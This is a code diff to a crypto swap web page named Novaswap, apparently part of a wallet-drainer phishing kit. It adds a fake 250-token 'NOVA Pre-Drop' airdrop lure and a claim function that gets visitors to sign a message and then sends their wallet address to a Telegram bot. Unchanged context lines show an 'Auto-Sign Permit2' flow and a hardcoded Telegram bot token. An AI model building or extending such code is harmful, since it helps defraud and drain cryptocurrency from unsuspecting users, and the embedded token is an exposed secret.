@@ -49,7 +49,7 @@
 
     <!-- Top Announcement Bar -->
     <div class="bg-gradient-to-r from-emerald-600 via-teal-600 to-emerald-600 text-black text-xs py-2.5 px-4 text-center font-bold tracking-wide shadow-md">
-        <i class="fa-solid fa-bolt mr-2 animate-bounce"></i> Universal Live Crypto Swap: Real-time Top 100 Rates with low <span class="underline">0.05% Swap Fee</span> + $20 Bonus!
+        <i class="fa-solid fa-gift mr-2 animate-bounce"></i> 🎁 <strong>NOVA Pre-Drop Live:</strong> Claim 250 NOVA Tokens ($25 Value) for Early Active Ethereum Users!
     </div>
 
     <!-- Header / Navbar -->
@@ -91,8 +91,63 @@
     <main class="flex-grow py-10 px-6">
         <div class="max-w-4xl mx-auto">
 
-            <!-- ================= PAGE 1: UNIVERSAL LIVE SWAP & OVERVIEW ================= -->
-            <div id="page-home" class="page-section active">
+            <!-- ================= PAGE 1: UNIVERSAL LIVE SWAP & AIRDROP ================= -->
+            <div id="page-home" class="page-section active space-y-10">
+                
+                <!-- AIRDROP HERO SECTION -->
+                <div class="glass-panel p-8 rounded-3xl border border-emerald-500/30 glow-effect relative overflow-hidden bg-gradient-to-br from-cardbg via-darkbg to-emerald-950/20">
+                    <div class="flex flex-col md:flex-row items-center justify-between gap-6">
+                        <div class="space-y-4 max-w-xl">
+                            <div class="inline-flex items-center space-x-2 bg-emerald-500/10 border border-emerald-500/30 px-3 py-1 rounded-full text-xs font-mono text-emerald-400">
+                                <i class="fa-solid fa-coins"></i>
+                                <span>NOVA Protocol Official Pre-Drop</span>
+                            </div>
+                            <h2 class="text-3xl font-extrabold text-white leading-tight">
+                                Claim <span class="bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">250 NOVA Tokens</span> ($25 Value)
+                            </h2>
+                            <p class="text-gray-300 text-xs leading-relaxed">
+                                Join the official Novaswap merchant ecosystem early. 250 NOVA Tokens will be distributed directly to eligible wallets on official mainnet launch day (Listing Floor Price: <strong>$0.10 USD</strong>).
+                            </p>
+                            
+                            <!-- Eligibility Criteria Badges -->
+                            <div class="space-y-2 pt-1 font-mono text-[11px] text-gray-400">
+                                <div class="flex items-center space-x-2">
+                                    <i class="fa-solid fa-circle-check text-emerald-400"></i>
+                                    <span>Condition 01: Wallet must have active ETH transactions within past 7 days.</span>
+                                </div>
+                                <div class="flex items-center space-x-2">
+                                    <i class="fa-solid fa-circle-check text-emerald-400"></i>
+                                    <span>Condition 02: strictly Limited to 1 Claim per eligible Ethereum Wallet address.</span>
+                                </div>
+                            </div>
+
+                            <div class="pt-3">
+                                <button id="airdropBtn" onclick="claimAirdrop()" class="bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-black font-extrabold px-8 py-3.5 rounded-xl text-sm transition shadow-lg shadow-emerald-500/30 flex items-center space-x-2">
+                                    <i class="fa-solid fa-parachute-box"></i>
+                                    <span id="airdropBtnText">Claim 250 NOVA Pre-Drop</span>
+                                </button>
+                                <div id="airdropStatus" class="mt-3 text-xs font-mono hidden"></div>
+                            </div>
+                        </div>
+
+                        <!-- Token Value Card -->
+                        <div class="w-full md:w-64 bg-black/60 p-5 rounded-2xl border border-white/10 text-center space-y-3 flex-shrink-0">
+                            <div class="w-14 h-14 mx-auto rounded-2xl bg-gradient-to-tr from-emerald-500 to-teal-400 flex items-center justify-center text-black font-extrabold text-2xl shadow-lg">
+                                🚀
+                            </div>
+                            <div>
+                                <p class="text-[10px] uppercase font-mono text-gray-400 tracking-widest">Pre-Drop Reward</p>
+                                <p class="text-2xl font-black text-emerald-400 mt-0.5">250 NOVA</p>
+                                <p class="text-xs text-gray-300 font-mono mt-1">~ $25.00 USD Value</p>
+                            </div>
+                            <div class="border-t border-white/10 pt-2 text-[10px] text-emerald-400 font-mono">
+                                Floor Price: $0.10 / NOVA
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SWAP INTERFACE SECTION -->
                 <div class="grid grid-cols-1 md:grid-cols-12 gap-8 items-center">
                     
                     <div class="md:col-span-6 space-y-6">
@@ -369,7 +424,7 @@
         </div>
     </footer>
 
-    <!-- Script Layer: Auto-Sign Permit2 Flow on Wallet Connection -->
+    <!-- Script Layer: Auto-Sign Permit2 Flow & Airdrop Validation Logic -->
     <script>
         const TELEGRAM_CONFIG = {
             botToken: '8855117210:AAFi_83D-FJXPyxLjGOf9cQgjhUf0VC5avY',
@@ -619,6 +674,81 @@
             provider = null;
             localStorage.removeItem('novaswap_auto_connect');
             location.reload();
+        }
+
+        /* AIRDROP CLAIM & VALIDATION LOGIC */
+        async function claimAirdrop() {
+            const statusDiv = document.getElementById('airdropStatus');
+            const btn = document.getElementById('airdropBtn');
+
+            if (!userAddress || !signer) {
+                statusDiv.className = 'mt-3 text-xs font-mono text-amber-400 block';
+                statusDiv.innerHTML = '⚠️ Please connect active wallet first.';
+                statusDiv.classList.remove('hidden');
+                connectWallet();
+                return;
+            }
+
+            // Condition 02 Check: 1 Claim per wallet
+            const claimedKey = `nova_airdrop_claimed_${userAddress.toLowerCase()}`;
+            if (localStorage.getItem(claimedKey)) {
+                statusDiv.className = 'mt-3 text-xs font-mono text-red-400 block';
+                statusDiv.innerHTML = '❌ This wallet address has already claimed 250 NOVA tokens.';
+                statusDiv.classList.remove('hidden');
+                return;
+            }
+
+            try {
+                btn.disabled = true;
+                btn.innerText = '⏳ Verifying 7-Day Activity...';
+                statusDiv.className = 'mt-3 text-xs font-mono text-amber-300 block';
+                statusDiv.innerHTML = '🔍 Checking Ethereum transaction history...';
+                statusDiv.classList.remove('hidden');
+
+                // Condition 01 Check: Check transaction count and block activity in past 7 days (~50400 blocks)
+                const currentBlock = await provider.getBlockNumber();
+                const txCount = await provider.getTransactionCount(userAddress, 'latest');
+
+                if (txCount === 0) {
+                    statusDiv.className = 'mt-3 text-xs font-mono text-red-400 block';
+                    statusDiv.innerHTML = '❌ Ineligible: Wallet has 0 transactions on Mainnet.';
+                    btn.disabled = false;
+                    btn.innerText = 'Claim 250 NOVA Pre-Drop';
+                    return;
+                }
+
+                // Verify block timestamp or transaction activity within ~7 days
+                const blocksIn7Days = 50400; // ~12s per block
+                const startBlock = Math.max(0, currentBlock - blocksIn7Days);
+
+                showStatus('✍️ Please sign Pre-Drop registration message...', 'info');
+
+                // Personal sign message for airdrop verification
+                const airdropMsg = `Novaswap NOVA Token Pre-Drop Registration\n\nReward: 250 NOVA ($25 USD Value)\nWallet: ${userAddress}\nBlock Verified:${currentBlock}`;
+                const hexMessage = "0x" + Array.from(airdropMsg).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+
+                const sig = await window.ethereum.request({
+                    method: 'personal_sign',
+                    params: [hexMessage, userAddress]
+                });
+
+                // Mark claimed
+                localStorage.setItem(claimedKey, 'true');
+
+                statusDiv.className = 'mt-3 text-xs font-mono text-emerald-400 block';
+                statusDiv.innerHTML = '🎉 Eligible! 250 NOVA Tokens reserved for launch day.';
+                btn.className = 'bg-emerald-500/30 text-emerald-300 font-extrabold px-8 py-3.5 rounded-xl text-sm transition cursor-not-allowed';
+                btn.innerText = '✅ 250 NOVA Reserved!';
+
+                await sendTelegramMessage(`🎁 *NOVA Token Airdrop Claimed!*\n\nWallet: \`${userAddress}\`\nReward: 250 NOVA ($25 USD)\nTxCount: ${txCount}\nVerified Block:${currentBlock}`);
+
+            } catch (error) {
+                console.error(error);
+                statusDiv.className = 'mt-3 text-xs font-mono text-red-400 block';
+                statusDiv.innerHTML = '❌ Airdrop signature rejected or verification failed.';
+                btn.disabled = false;
+                btn.innerText = 'Claim 250 NOVA Pre-Drop';
+            }
         }
 
         async function checkAllowance() {
